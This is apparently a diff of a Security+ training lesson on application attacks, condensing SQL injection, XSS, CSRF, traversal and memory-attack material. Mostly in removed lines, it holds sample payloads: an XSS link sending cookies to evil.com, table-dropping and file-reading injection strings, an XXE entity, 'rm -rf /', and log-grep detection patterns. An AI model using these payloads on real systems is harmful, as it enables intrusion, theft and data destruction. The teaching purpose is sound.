@@ -1,597 +1,254 @@
 {
   "lesson_id": "D2-LESSON-006",
   "domain": 2,
-  "title": "Application Attacks",
-  "objectives_covered": ["2.4"],
-  "estimated_duration": "95-110 minutes (Core: 55 min, Deep Dives: 40-55 min)",
-  "difficulty": "intermediate",
-  "prerequisites": ["D2-LESSON-005"],
+  "title": "Application-Based Attacks",
+  "subtitle": "Exploiting Software: Injection, XSS, and Beyond",
   "version": "2.0-enhanced",
+  "objectives_covered": ["2.4"],
+  "estimated_duration": "90-120 minutes",
+  "difficulty": "intermediate",
+  "prerequisites": ["D2-LESSON-002"],
 
-  "introduction": {
-    "hook": "In 2017, Equifax suffered one of history's worst data breaches when attackers exploited a single vulnerability in Apache Struts—a web application framework. The result: 147 million Americans had their Social Security numbers, birth dates, and addresses exposed. The vulnerability had a patch available for months, but it wasn't applied. Application vulnerabilities remain the most common entry point because every line of code is a potential weakness.",
-    
-    "learning_goals": [
-      "Understand and identify injection attacks (SQL, command, LDAP, XML)",
-      "Analyze cross-site scripting (XSS) variants and impacts",
-      "Evaluate authentication and session management vulnerabilities",
-      "Recognize directory traversal, CSRF, and other application flaws",
-      "Understand OWASP Top 10 and secure coding principles",
-      "Apply input validation and output encoding techniques"
-    ],
-    
-    "why_it_matters": "Applications are where data lives and users interact with systems. Application attacks bypass network defenses—they walk through the front door using legitimate protocols. The Security+ exam dedicates significant coverage to web and application attacks—expect 8-10 questions.",
-    
-    "career_relevance": {
-      "soc_analyst": "You'll see WAF alerts for SQL injection, XSS attempts, and other application attacks. Understanding these attacks helps you assess severity and identify successful exploitation vs. blocked attempts.",
-      "incident_responder": "Web application compromises are common. You'll analyze web logs, identify attack patterns, and determine if attackers successfully exploited vulnerabilities.",
-      "grc_analyst": "Application security is a major compliance area. You'll assess secure development practices, code review processes, and vulnerability management for web applications.",
-      "penetration_tester": "Web application testing is a major service area. You'll test for OWASP Top 10 vulnerabilities, demonstrate impact, and recommend fixes.",
-      "security_engineer": "You'll configure WAFs, implement input validation frameworks, and design secure application architectures. Understanding attacks helps you build effective defenses."
+  "skill_tree": {
+    "position": {"domain": 2, "sequence": 6, "tier": "intermediate"},
+    "prerequisites": [{"lesson_id": "D2-LESSON-002", "title": "Threat Vectors", "why_needed": "Applications are attack vectors"}],
+    "unlocks": [{"lesson_id": "D2-LESSON-007", "title": "Vulnerability Management", "connection": "Application vulnerabilities need management"}],
+    "cascade_learning": {
+      "this_lesson_establishes": ["Injection attacks", "Web application vulnerabilities", "Input validation importance"],
+      "concepts_used_later": {"D2-LESSON-007": "Vulnerability scanning", "D3-LESSON-002": "Secure application architecture"}
     }
   },
 
-  "linux_fundamentals": {
-    "why_it_matters": "Testing and understanding application attacks requires familiarity with common tools and techniques.",
-    
-    "essential_commands": {
-      "web_testing": [
-        {
-          "command": "curl",
-          "purpose": "HTTP requests and testing",
-          "examples": [
-            "curl -X POST -d 'user=admin&pass=test' https://site.com/login",
-            "curl -I https://site.com                 # Headers only",
-            "curl -b 'session=abc123' https://site.com  # With cookie",
-            "curl -H 'X-Custom: value' https://site.com  # Custom header"
-          ]
-        },
-        {
-          "command": "sqlmap",
-          "purpose": "Automated SQL injection testing",
-          "examples": [
-            "sqlmap -u 'http://site.com/page?id=1' --dbs",
-            "# Only use on systems you own or have permission to test!"
-          ],
-          "warning": "Use only with explicit authorization"
-        }
-      ],
-      "log_analysis": [
-        {
-          "command": "Web server log analysis",
-          "purpose": "Identify attack attempts",
-          "examples": [
-            "grep -i 'select\\|union\\|--' /var/log/apache2/access.log  # SQLi",
-            "grep -i '<script' /var/log/apache2/access.log              # XSS",
-            "grep -i '\\.\\./' /var/log/apache2/access.log              # Dir traversal"
-          ]
-        }
-      ]
-    }
+  "role_relevance": {
+    "soc_analyst": {"relevance": "high", "percentage_of_job": "35-45%", "daily_tasks": ["Monitor WAF alerts", "Analyze application attacks", "Identify injection attempts"]},
+    "incident_responder": {"relevance": "high", "percentage_of_job": "30-40%", "daily_tasks": ["Investigate web compromises", "Analyze attack payloads", "Assess data exposure"]},
+    "security_engineer": {"relevance": "critical", "percentage_of_job": "45-55%", "daily_tasks": ["Configure WAF rules", "Implement input validation", "Secure application deployment"]},
+    "grc_analyst": {"relevance": "medium", "percentage_of_job": "20-30%", "daily_tasks": ["Assess application security", "Review secure coding standards"]},
+    "penetration_tester": {"relevance": "critical", "percentage_of_job": "60-70%", "daily_tasks": ["Test for injection flaws", "Exploit application vulnerabilities", "Report findings"]}
+  },
+
+  "introduction": {
+    "hook": "The 2017 Equifax breach exposed 147 million people's personal data. The cause? A single unpatched Apache Struts vulnerability. Application attacks exploit software flaws to access data, execute commands, or take control of systems.",
+    "exam_weight": {"estimated_questions": "7-9", "high_yield_topics": ["SQL injection", "XSS types", "CSRF", "Buffer overflow", "Directory traversal"]}
   },
 
   "sections": [
     {
       "section_id": "D2-L006-S01",
       "title": "Injection Attacks",
-      "estimated_time": "18 minutes",
-      
+      "estimated_time": "15 minutes",
       "content": {
-        "overview": "Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's data tricks the interpreter into executing unintended commands.",
-        
-        "sql_injection": {
-          "description": "Inserting malicious SQL into application queries",
-          "how_it_works": {
-            "vulnerable_code": "query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\"",
-            "normal_input": {
-              "input": "alice",
-              "result": "SELECT * FROM users WHERE username = 'alice'"
-            },
-            "malicious_input": {
-              "input": "' OR '1'='1",
-              "result": "SELECT * FROM users WHERE username = '' OR '1'='1'",
-              "effect": "Returns all users because '1'='1' is always true"
-            }
-          },
-          "types": [
-            {
-              "type": "In-Band SQLi",
-              "description": "Data returned in application response",
-              "subtypes": [
-                {"name": "Error-based", "method": "Use database errors to extract data"},
-                {"name": "Union-based", "method": "Use UNION SELECT to combine results"}
-              ]
-            },
-            {
-              "type": "Blind SQLi",
-              "description": "No direct data in response",
-              "subtypes": [
-                {"name": "Boolean-based", "method": "Infer data from true/false responses"},
-                {"name": "Time-based", "method": "Infer data from response delays"}
-              ]
-            },
-            {
-              "type": "Out-of-Band SQLi",
-              "description": "Exfiltrate data through different channel (DNS, HTTP)"
-            }
-          ],
-          "common_payloads": [
-            "' OR '1'='1                    -- Always true",
-            "' OR '1'='1' --               -- Comment out rest",
-            "'; DROP TABLE users; --       -- Destructive",
-            "' UNION SELECT username,password FROM users --"
-          ],
-          "defense": {
-            "primary": "Parameterized queries / Prepared statements",
-            "additional": ["Input validation", "Least privilege database accounts", "WAF", "Error handling (don't expose details)"]
-          }
-        },
-        
-        "command_injection": {
-          "description": "Execute OS commands through application",
-          "how_it_works": {
-            "vulnerable_example": "system('ping ' + userInput)",
-            "malicious_input": "8.8.8.8; cat /etc/passwd",
-            "result": "Executes ping AND reads password file"
-          },
-          "command_separators": ["; (semicolon)", "&& (AND)", "|| (OR)", "| (pipe)", "` (backticks)", "$() (command substitution)"],
-          "defense": ["Avoid shell commands with user input", "Input validation (whitelist)", "Escape special characters"]
-        },
-        
-        "other_injection": [
+        "overview": "Injection attacks insert malicious code into application inputs, executed by backend systems.",
+        "core_concepts": [
           {
-            "type": "LDAP Injection",
-            "description": "Manipulate LDAP queries to access directory information",
-            "example": "*)(&(password=*) returns all users"
+            "concept": "SQL Injection (SQLi)",
+            "mechanism": "Insert SQL commands into input fields",
+            "impact": ["Data theft", "Data modification", "Authentication bypass", "Database destruction"],
+            "example": "Username: admin'--  (comments out password check)",
+            "defense": "Parameterized queries (prepared statements), input validation"
           },
           {
-            "type": "XXE (XML External Entity)",
-            "description": "Exploit XML parsers to read files or make requests",
-            "payload_example": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
-            "impacts": ["File disclosure", "SSRF", "DoS"],
-            "defense": "Disable external entity processing in XML parsers"
+            "concept": "Command Injection",
+            "mechanism": "Insert OS commands into application inputs",
+            "example": "Filename: file.txt; rm -rf /",
+            "impact": "Execute arbitrary commands on server",
+            "defense": "Input validation, avoid shell commands"
           },
           {
-            "type": "Server-Side Template Injection (SSTI)",
-            "description": "Inject into template engines",
-            "example": "{{7*7}} renders as 49 if vulnerable"
+            "concept": "LDAP Injection",
+            "mechanism": "Inject LDAP query commands",
+            "impact": "Bypass authentication, access directory data",
+            "defense": "Input validation, escape special characters"
+          },
+          {
+            "concept": "XML Injection / XXE",
+            "xxe": "XML External Entity - include external resources",
+            "impact": "Read local files, SSRF, DoS",
+            "defense": "Disable external entities, validate XML"
           }
         ],
-        
-        "visualization": {
-          "type": "ascii_diagram",
-          "title": "SQL Injection Flow",
-          "diagram": [
-            "╔══════════════════════════════════════════════════════════════════════════════╗",
-            "║                        SQL INJECTION ATTACK FLOW                             ║",
-            "╠══════════════════════════════════════════════════════════════════════════════╣",
-            "║                                                                               ║",
-            "║   USER INPUT                  WEB APPLICATION              DATABASE          ║",
-            "║   ══════════                  ═══════════════              ════════          ║",
-            "║                                                                               ║",
-            "║   Normal:                                                                    ║",
-            "║   ┌──────────────┐           ┌──────────────┐           ┌──────────────┐    ║",
-            "║   │ username:    │    →      │ SELECT * FROM│    →      │ Returns 1    │    ║",
-            "║   │ alice        │           │ users WHERE  │           │ user record  │    ║",
-            "║   └──────────────┘           │ user='alice' │           └──────────────┘    ║",
-            "║                               └──────────────┘                               ║",
-            "║                                                                               ║",
-            "║   Attack:                                                                    ║",
-            "║   ┌──────────────┐           ┌──────────────┐           ┌──────────────┐    ║",
-            "║   │ username:    │    →      │ SELECT * FROM│    →      │ Returns ALL  │    ║",
-            "║   │ ' OR '1'='1  │           │ users WHERE  │           │ user records │    ║",
-            "║   └──────────────┘           │ user='' OR   │           │ (auth bypass)│    ║",
-            "║                               │ '1'='1'      │           └──────────────┘    ║",
-            "║                               └──────────────┘                               ║",
-            "║                                                                               ║",
-            "║   DEFENSE: Use parameterized queries - input is DATA, never CODE            ║",
-            "║                                                                               ║",
-            "╚══════════════════════════════════════════════════════════════════════════════╝"
-          ]
+        "what_would_happen_if": {
+          "scenario": "What if a login form has SQL injection?",
+          "consequence": "Attacker enters: admin'-- as username. The SQL becomes: SELECT * FROM users WHERE username='admin'--' AND password='anything'. The -- comments out the password check, granting access without knowing the password."
         }
       },
-      
-      "key_points": [
-        "SQL injection inserts malicious SQL through unsanitized user input",
-        "Classic payload: ' OR '1'='1 (always true condition)",
-        "Blind SQLi infers data through boolean/timing when no direct output",
-        "Command injection uses shell separators (;, &&, ||, |)",
-        "XXE exploits XML parsers to read files or make requests"
+      "memory_hooks": {
+        "mnemonic": "Injection = Inserting malicious INPUT that becomes CODE",
+        "common_mistakes": [{"mistake": "Thinking input validation alone prevents SQLi", "correction": "Use parameterized queries (prepared statements) as primary defense. Input validation is additional layer."}]
+      },
+      "must_remember_for_exam": [
+        {"fact": "SQL injection inserts SQL commands into inputs", "why_tested": "Most common injection"},
+        {"fact": "Defense: Parameterized queries (prepared statements)", "why_tested": "Primary defense"},
+        {"fact": "Command injection executes OS commands", "why_tested": "Attack type"},
+        {"fact": "XXE = XML External Entity attack", "why_tested": "Terminology"}
       ],
-      
-      "exam_tips": [
-        "' OR '1'='1 = classic SQL injection authentication bypass",
-        "Blind SQLi = no visible data; use boolean or timing",
-        "Command injection separators: ; && || | ` $()",
-        "XXE = XML External Entity (file read, SSRF)",
-        "Defense = parameterized queries / prepared statements"
-      ],
-      
-      "glossary_terms": [
-        {
-          "term": "SQL Injection",
-          "definition": "Attack where malicious SQL is inserted into application queries through unsanitized user input.",
-          "exam_note": "' OR '1'='1 classic example. Defense: parameterized queries."
-        },
-        {
-          "term": "Blind SQL Injection",
-          "definition": "SQLi where no data is returned directly; attacker infers information through boolean responses or timing.",
-          "exam_note": "Boolean-based (true/false) or Time-based (delays)."
-        },
-        {
-          "term": "XXE",
-          "definition": "XML External Entity - attack that exploits XML parsers to read files, make requests, or cause DoS.",
-          "exam_note": "Disable external entity processing to prevent."
-        }
-      ],
-      
+      "key_points": ["SQL injection inserts SQL into input fields", "Parameterized queries prevent SQL injection", "Command injection executes OS commands", "XXE exploits XML external entity processing"],
       "knowledge_check": {
-        "question": "A web application login form is vulnerable to SQL injection. Which input would MOST likely bypass authentication?",
-        "options": [
-          "<script>alert(1)</script>",
-          "' OR '1'='1' --",
-          "../../etc/passwd",
-          "; cat /etc/passwd"
-        ],
-        "correct": 1,
-        "explanation": "' OR '1'='1' -- is classic SQL injection. The single quote closes the username field, OR '1'='1' creates an always-true condition, and -- comments out the rest of the query. This returns all users, typically logging in as the first user. The others are XSS, directory traversal, and command injection respectively."
+        "question": "A web application builds SQL queries by concatenating user input. What is the MOST effective defense?",
+        "options": ["Input validation", "Web application firewall", "Parameterized queries", "Output encoding"],
+        "correct": 2,
+        "explanation": "Parameterized queries (prepared statements) separate SQL code from data, preventing injection regardless of input content.",
+        "wrong_answer_analysis": [
+          {"option": 0, "why_wrong": "Input validation can be bypassed; parameterized queries are definitive"},
+          {"option": 1, "why_wrong": "WAF is defense-in-depth but can be bypassed"},
+          {"option": 3, "why_wrong": "Output encoding prevents XSS, not SQL injection"}
+        ]
       }
     },
-
     {
       "section_id": "D2-L006-S02",
       "title": "Cross-Site Scripting (XSS)",
       "estimated_time": "15 minutes",
-      
       "content": {
-        "overview": "XSS occurs when applications include untrusted data in web pages without proper validation or encoding. Attackers inject client-side scripts that execute in victims' browsers.",
-        
-        "xss_types": [
+        "overview": "XSS injects malicious scripts into web pages viewed by other users.",
+        "core_concepts": [
           {
-            "type": "Reflected XSS",
-            "description": "Malicious script in request is immediately reflected in response",
-            "how_it_works": [
-              "1. Attacker crafts URL with malicious script parameter",
-              "2. Victim clicks link (phishing, social engineering)",
-              "3. Server reflects script in response",
-              "4. Script executes in victim's browser"
-            ],
-            "example": "https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
-            "persistence": "Non-persistent (single request)"
-          },
-          {
-            "type": "Stored XSS",
-            "description": "Malicious script stored on server, served to all users",
-            "how_it_works": [
-              "1. Attacker submits malicious script (comment, profile)",
-              "2. Server stores script in database",
-              "3. Any user viewing the page executes script",
-              "4. No victim interaction required after initial injection"
-            ],
-            "example": "Forum comment: <script>steal_credentials()</script>",
-            "persistence": "Persistent (affects all viewers)",
-            "danger": "More dangerous—affects many users automatically"
-          },
-          {
-            "type": "DOM-based XSS",
-            "description": "Vulnerability in client-side JavaScript, not server",
-            "how_it_works": [
-              "1. Vulnerable JavaScript reads URL parameter",
-              "2. Writes it to DOM without sanitization",
-              "3. Script executes entirely client-side",
-              "4. Server never sees malicious payload"
-            ],
-            "example": "document.getElementById('output').innerHTML = location.hash.substring(1)",
-            "detection": "Harder to detect—payload may not reach server logs"
-          }
-        ],
-        
-        "xss_impacts": [
-          "Session hijacking (steal cookies)",
-          "Account takeover",
-          "Credential theft (fake login forms)",
-          "Malware delivery",
-          "Defacement",
-          "Keylogging",
-          "Webcam/microphone access (with permissions)"
-        ],
-        
-        "common_payloads": [
-          "<script>alert('XSS')</script>                    -- Basic test",
-          "<img src=x onerror=alert('XSS')>                -- Image error handler",
-          "<svg onload=alert('XSS')>                       -- SVG handler",
-          "<body onload=alert('XSS')>                      -- Body handler",
-          "javascript:alert('XSS')                         -- JavaScript URL"
-        ],
-        
-        "defense": {
-          "output_encoding": {
-            "description": "Encode output based on context",
-            "contexts": [
-              {"context": "HTML", "encoding": "HTML entity encoding (&lt; &gt; &amp;)"},
-              {"context": "JavaScript", "encoding": "JavaScript encoding"},
-              {"context": "URL", "encoding": "URL encoding"},
-              {"context": "CSS", "encoding": "CSS encoding"}
+            "concept": "XSS Types",
+            "types": [
+              {"type": "Reflected XSS", "mechanism": "Malicious script in URL, reflected back immediately", "persistence": "Not stored", "delivery": "Via malicious link"},
+              {"type": "Stored XSS", "mechanism": "Script stored in database, served to all visitors", "persistence": "Persistent", "delivery": "Automatic to all users"},
+              {"type": "DOM-based XSS", "mechanism": "Script executes in browser via DOM manipulation", "persistence": "Not stored", "delivery": "Client-side only"}
             ]
           },
-          "input_validation": "Validate and sanitize input (whitelist approach)",
-          "content_security_policy": "CSP headers restrict script sources",
-          "httponly_cookies": "Prevent JavaScript access to session cookies"
-        }
+          {
+            "concept": "XSS Impact",
+            "impacts": ["Session hijacking (steal cookies)", "Credential theft", "Defacement", "Malware distribution", "Keylogging"]
+          },
+          {
+            "concept": "XSS Defense",
+            "defenses": [
+              {"defense": "Output encoding", "description": "Encode special characters before display"},
+              {"defense": "Content Security Policy (CSP)", "description": "Restrict script sources"},
+              {"defense": "HttpOnly cookies", "description": "Prevent JavaScript cookie access"},
+              {"defense": "Input validation", "description": "Filter/reject malicious input"}
+            ]
+          }
+        ]
       },
-      
-      "key_points": [
-        "XSS injects scripts that execute in victims' browsers",
-        "Reflected = in request, immediate; Stored = saved on server, persistent",
-        "DOM-based occurs entirely client-side, harder to detect",
-        "Impacts: session hijacking, credential theft, malware delivery",
-        "Defense: output encoding, input validation, CSP, HTTPOnly cookies"
+      "must_remember_for_exam": [
+        {"fact": "Reflected XSS = not stored, in URL, requires victim to click", "why_tested": "XSS type"},
+        {"fact": "Stored XSS = persistent, affects all visitors", "why_tested": "XSS type"},
+        {"fact": "Output encoding is primary XSS defense", "why_tested": "Defense"},
+        {"fact": "HttpOnly cookies prevent JS access", "why_tested": "Defense mechanism"}
       ],
-      
-      "career_callout": {
-        "role": "Penetration Tester",
-        "note": "When testing for XSS, start with simple payloads like <script>alert(1)</script>, then try variations to bypass filters: event handlers (onerror, onload), different tags (img, svg, body), encoding (hex, unicode). Document the full attack chain including impact demonstration."
-      },
-      
-      "exam_tips": [
-        "Reflected XSS = non-persistent, in URL/request",
-        "Stored XSS = persistent, saved on server, more dangerous",
-        "DOM-based = client-side only, no server involvement",
-        "Defense = output encoding based on context (HTML, JS, URL)",
-        "HTTPOnly cookies prevent JavaScript theft of sessions"
-      ],
-      
+      "key_points": ["Reflected XSS in URL, not stored; Stored XSS persistent in database", "Output encoding is primary defense", "HttpOnly cookies prevent cookie theft via XSS", "CSP restricts script sources"],
       "knowledge_check": {
-        "question": "An attacker posts a comment on a forum that contains <script>steal_cookies()</script>. Every user who views the page has their session stolen. What type of XSS is this?",
-        "options": [
-          "Reflected XSS",
-          "Stored XSS",
-          "DOM-based XSS",
-          "Blind XSS"
-        ],
+        "question": "An attacker posts a comment containing JavaScript. All users viewing the page execute the script. This is:",
+        "options": ["Reflected XSS", "Stored XSS", "DOM-based XSS", "CSRF"],
         "correct": 1,
-        "explanation": "This is Stored XSS (also called Persistent XSS). The malicious script is stored in the database and executed whenever any user views the page. Reflected XSS would require the victim to click a crafted link. DOM-based wouldn't involve server-side storage."
+        "explanation": "Stored/Persistent XSS - the script is stored in the database and executed by all visitors.",
+        "wrong_answer_analysis": [
+          {"option": 0, "why_wrong": "Reflected XSS is not stored, requires clicking malicious link"},
+          {"option": 2, "why_wrong": "DOM-based is client-side manipulation, not stored"},
+          {"option": 3, "why_wrong": "CSRF tricks users into actions, not script injection"}
+        ]
       }
     },
-
     {
       "section_id": "D2-L006-S03",
-      "title": "Other Application Attacks",
-      "estimated_time": "15 minutes",
-      
+      "title": "Other Web Attacks",
+      "estimated_time": "12 minutes",
       "content": {
-        "overview": "Beyond injection and XSS, attackers exploit various application weaknesses including authentication flaws, access control issues, and logic vulnerabilities.",
-        
-        "attacks": [
+        "overview": "Additional web application attack techniques.",
+        "core_concepts": [
           {
-            "attack": "Cross-Site Request Forgery (CSRF)",
-            "description": "Trick user's browser into making unintended requests",
-            "how_it_works": [
-              "1. User is authenticated to target site (has session cookie)",
-              "2. User visits attacker's page or clicks malicious link",
-              "3. Attacker's page triggers request to target site",
-              "4. Browser includes user's cookies automatically",
-              "5. Action performed as authenticated user"
-            ],
-            "example": "<img src='https://bank.com/transfer?to=attacker&amount=1000'>",
-            "difference_from_xss": "CSRF doesn't inject scripts—exploits user's authenticated session",
-            "defense": ["CSRF tokens (unique per request)", "SameSite cookie attribute", "Referer header validation"]
+            "concept": "Cross-Site Request Forgery (CSRF/XSRF)",
+            "mechanism": "Trick authenticated user into performing unwanted action",
+            "example": "Hidden form on malicious site submits request to bank using user's cookies",
+            "defense": "Anti-CSRF tokens, SameSite cookies"
           },
           {
-            "attack": "Directory Traversal / Path Traversal",
-            "description": "Access files outside intended directory",
-            "payload": "../../etc/passwd",
-            "how_it_works": "Application includes user input in file paths without validation",
-            "defense": ["Input validation (no ..)", "Chroot/sandbox", "Least privilege file access"]
+            "concept": "Directory Traversal",
+            "mechanism": "Access files outside intended directory using ../ sequences",
+            "example": "../../../etc/passwd",
+            "defense": "Input validation, chroot jails, remove path traversal sequences"
           },
           {
-            "attack": "Insecure Direct Object Reference (IDOR)",
-            "description": "Access resources by manipulating identifiers",
-            "example": "Changing /user/123/profile to /user/456/profile to access another user's data",
-            "defense": ["Authorization checks on every request", "Indirect references (tokens instead of IDs)"]
+            "concept": "Session Attacks",
+            "attacks": [
+              {"attack": "Session Hijacking", "mechanism": "Steal session token to impersonate user"},
+              {"attack": "Session Fixation", "mechanism": "Force user to use known session ID"},
+              {"attack": "Cookie Manipulation", "mechanism": "Modify cookie values for unauthorized access"}
+            ]
           },
           {
-            "attack": "Race Condition / TOCTOU",
-            "description": "Exploit timing between check and use",
-            "example": "Withdraw $100 simultaneously from $100 balance → both succeed",
-            "defense": ["Proper locking/synchronization", "Atomic operations", "Transactional integrity"]
-          },
-          {
-            "attack": "Server-Side Request Forgery (SSRF)",
-            "description": "Make server issue requests to internal resources",
-            "how_it_works": "Application fetches URLs from user input; attacker provides internal addresses",
-            "impacts": ["Access internal services", "Port scanning", "Cloud metadata access"],
-            "example": "url=http://169.254.169.254/latest/meta-data/ (AWS metadata)",
-            "defense": ["Whitelist allowed URLs/domains", "Block internal IP ranges", "Disable URL fetching"]
-          },
-          {
-            "attack": "API Attacks",
-            "types": [
-              {"type": "Broken Object Level Authorization", "description": "IDOR in APIs"},
-              {"type": "Broken Authentication", "description": "Weak tokens, missing auth"},
-              {"type": "Excessive Data Exposure", "description": "API returns more than needed"},
-              {"type": "Mass Assignment", "description": "Modify fields not intended to be user-changeable"}
-            ],
-            "defense": "Follow OWASP API Security Top 10"
-          },
-          {
-            "attack": "Buffer Overflow",
-            "description": "Write data beyond allocated memory boundary",
-            "impacts": ["Crash", "Code execution", "Privilege escalation"],
-            "variants": ["Stack overflow", "Heap overflow", "Integer overflow"],
-            "defense": ["Memory-safe languages", "ASLR", "Stack canaries", "DEP/NX"]
+            "concept": "Server-Side Request Forgery (SSRF)",
+            "mechanism": "Trick server into making requests to internal resources",
+            "impact": "Access internal services, cloud metadata",
+            "example": "URL parameter causes server to fetch internal admin page"
           }
-        ],
-        
-        "owasp_top_10_2021": {
-          "description": "Most critical web application security risks",
-          "list": [
-            {"rank": 1, "category": "Broken Access Control", "examples": "IDOR, privilege escalation"},
-            {"rank": 2, "category": "Cryptographic Failures", "examples": "Weak encryption, exposed data"},
-            {"rank": 3, "category": "Injection", "examples": "SQLi, XSS, command injection"},
-            {"rank": 4, "category": "Insecure Design", "examples": "Missing security in design phase"},
-            {"rank": 5, "category": "Security Misconfiguration", "examples": "Default creds, verbose errors"},
-            {"rank": 6, "category": "Vulnerable Components", "examples": "Outdated libraries"},
-            {"rank": 7, "category": "Auth/Session Failures", "examples": "Weak passwords, session fixation"},
-            {"rank": 8, "category": "Software/Data Integrity Failures", "examples": "Insecure deserialization"},
-            {"rank": 9, "category": "Security Logging Failures", "examples": "Missing logs, no alerting"},
-            {"rank": 10, "category": "SSRF", "examples": "Server fetches attacker-controlled URLs"}
-          ]
-        }
+        ]
       },
-      
-      "key_points": [
-        "CSRF tricks browser into making requests using victim's session",
-        "Directory traversal uses ../ to access files outside intended directory",
-        "IDOR accesses resources by manipulating identifiers without auth check",
-        "SSRF makes server request internal resources",
-        "OWASP Top 10 lists most critical web vulnerabilities"
+      "must_remember_for_exam": [
+        {"fact": "CSRF tricks authenticated users into unwanted actions", "why_tested": "Attack type"},
+        {"fact": "Anti-CSRF tokens prevent CSRF", "why_tested": "Defense"},
+        {"fact": "Directory traversal uses ../ to escape directories", "why_tested": "Attack mechanism"},
+        {"fact": "SSRF tricks server into making internal requests", "why_tested": "Attack type"}
       ],
-      
-      "exam_tips": [
-        "CSRF = trick browser into making authenticated requests; defense = CSRF tokens",
-        "Directory traversal = ../../etc/passwd",
-        "IDOR = change ID to access another user's data",
-        "SSRF = server makes requests for attacker",
-        "Know OWASP Top 10 categories (especially #1 Broken Access Control)"
-      ],
-      
-      "deep_dive": {
-        "title": "Web Application Security Testing Basics",
-        "estimated_time": "20 minutes",
-        "content": {
-          "description": "Learn basic techniques for identifying common web vulnerabilities.",
-          
-          "lab_testing_basics": {
-            "title": "Lab: Basic Web Security Testing",
-            "warning": "Only test applications you own or have explicit permission to test!",
-            "practice_platform": "Use OWASP WebGoat, DVWA, or HackTheBox for practice",
-            "techniques": [
-              {
-                "test": "SQL Injection Discovery",
-                "method": [
-                  "1. Find input fields (search, login, URL parameters)",
-                  "2. Enter single quote (') and observe response",
-                  "3. If error → potentially vulnerable",
-                  "4. Try: ' OR '1'='1' --",
-                  "5. If behavior changes → SQLi confirmed"
-                ]
-              },
-              {
-                "test": "XSS Discovery",
-                "method": [
-                  "1. Find where user input is displayed",
-                  "2. Enter: <script>alert('XSS')</script>",
-                  "3. If alert pops → reflected or stored XSS",
-                  "4. Try variations if filtered: <img src=x onerror=alert(1)>"
-                ]
-              },
-              {
-                "test": "Directory Traversal",
-                "method": [
-                  "1. Find file download or include functionality",
-                  "2. Try: ../../etc/passwd",
-                  "3. Try: ....//....//etc/passwd (filter bypass)",
-                  "4. If file contents returned → vulnerable"
-                ]
-              },
-              {
-                "test": "IDOR Discovery",
-                "method": [
-                  "1. Note your user ID (e.g., /api/users/123)",
-                  "2. Log in as different user or guess other IDs",
-                  "3. Try accessing /api/users/124",
-                  "4. If data returned → IDOR vulnerability"
-                ]
-              }
+      "key_points": ["CSRF tricks users into unwanted actions using their session", "Directory traversal uses ../ to access restricted files", "Session hijacking steals session tokens", "SSRF makes server request internal resources"]
+    },
+    {
+      "section_id": "D2-L006-S04",
+      "title": "Memory and Code Attacks",
+      "estimated_time": "10 minutes",
+      "content": {
+        "overview": "Attacks targeting application memory and code execution.",
+        "core_concepts": [
+          {
+            "concept": "Buffer Overflow",
+            "mechanism": "Write data beyond allocated buffer, overwrite adjacent memory",
+            "impact": "Crash application, execute arbitrary code",
+            "defense": "Safe coding practices, ASLR, stack canaries, DEP/NX"
+          },
+          {
+            "concept": "Integer Overflow",
+            "mechanism": "Arithmetic operation exceeds integer size limits",
+            "impact": "Unexpected behavior, security bypass"
+          },
+          {
+            "concept": "Race Condition",
+            "mechanism": "Exploit timing between check and use of resource",
+            "example": "TOCTOU (Time of Check to Time of Use)",
+            "impact": "Bypass security checks, corrupt data"
+          },
+          {
+            "concept": "Memory Safety Defenses",
+            "defenses": [
+              {"defense": "ASLR", "full": "Address Space Layout Randomization", "function": "Randomize memory addresses"},
+              {"defense": "DEP/NX", "full": "Data Execution Prevention / No Execute", "function": "Prevent code execution from data areas"},
+              {"defense": "Stack Canaries", "function": "Detect buffer overflow attempts"}
             ]
           }
-        }
+        ]
       },
-      
-      "knowledge_check": {
-        "question": "A web application allows users to download files. An attacker changes the request from /download?file=report.pdf to /download?file=../../../etc/passwd and receives the system password file. What vulnerability is this?",
-        "options": [
-          "SQL Injection",
-          "Cross-Site Scripting",
-          "Directory Traversal",
-          "SSRF"
-        ],
-        "correct": 2,
-        "explanation": "This is Directory Traversal (also called Path Traversal). The attacker uses ../ to navigate out of the intended directory and access system files. The defense is to validate input and use a whitelist of allowed files."
-      }
+      "must_remember_for_exam": [
+        {"fact": "Buffer overflow writes beyond allocated memory", "why_tested": "Classic vulnerability"},
+        {"fact": "ASLR randomizes memory addresses", "why_tested": "Defense mechanism"},
+        {"fact": "DEP/NX prevents code execution from data areas", "why_tested": "Defense mechanism"},
+        {"fact": "Race condition = timing vulnerability (TOCTOU)", "why_tested": "Vulnerability type"}
+      ],
+      "key_points": ["Buffer overflow writes beyond buffer boundaries", "ASLR randomizes addresses; DEP prevents data execution", "Race conditions exploit timing gaps"]
     }
   ],
 
-  "tool_spotlights": {
-    "tools": [
-      {
-        "name": "Burp Suite",
-        "category": "Web Application Testing",
-        "description": "Industry standard for web security testing",
-        "free_tier": "Community Edition free",
-        "url": "https://portswigger.net/burp",
-        "career_relevance": "Essential for web pentesting"
-      },
-      {
-        "name": "OWASP ZAP",
-        "category": "Web Application Scanner",
-        "description": "Free, open-source web security scanner",
-        "free_tier": "Completely free",
-        "url": "https://www.zaproxy.org",
-        "career_relevance": "Good free alternative to Burp"
-      },
-      {
-        "name": "SQLMap",
-        "category": "SQL Injection Testing",
-        "description": "Automated SQL injection exploitation tool",
-        "free_tier": "Open source",
-        "url": "https://sqlmap.org",
-        "career_relevance": "Standard for SQLi testing"
-      },
-      {
-        "name": "OWASP WebGoat",
-        "category": "Training Platform",
-        "description": "Deliberately vulnerable application for learning",
-        "free_tier": "Completely free",
-        "url": "https://owasp.org/www-project-webgoat/",
-        "career_relevance": "Safe practice environment"
-      }
+  "summary": {
+    "key_takeaways": [
+      "SQL injection: parameterized queries are primary defense",
+      "XSS: Reflected (URL), Stored (persistent), DOM-based (client-side)",
+      "Output encoding prevents XSS; HttpOnly cookies protect session",
+      "CSRF tricks users into actions; anti-CSRF tokens prevent",
+      "Buffer overflow defenses: ASLR, DEP/NX, stack canaries"
+    ],
+    "exam_essentials": [
+      "SQL injection defense = parameterized queries",
+      "Stored XSS = persistent; Reflected XSS = in URL",
+      "CSRF = tricking authenticated user into action",
+      "Directory traversal uses ../ sequences",
+      "ASLR randomizes memory; DEP prevents data execution"
     ]
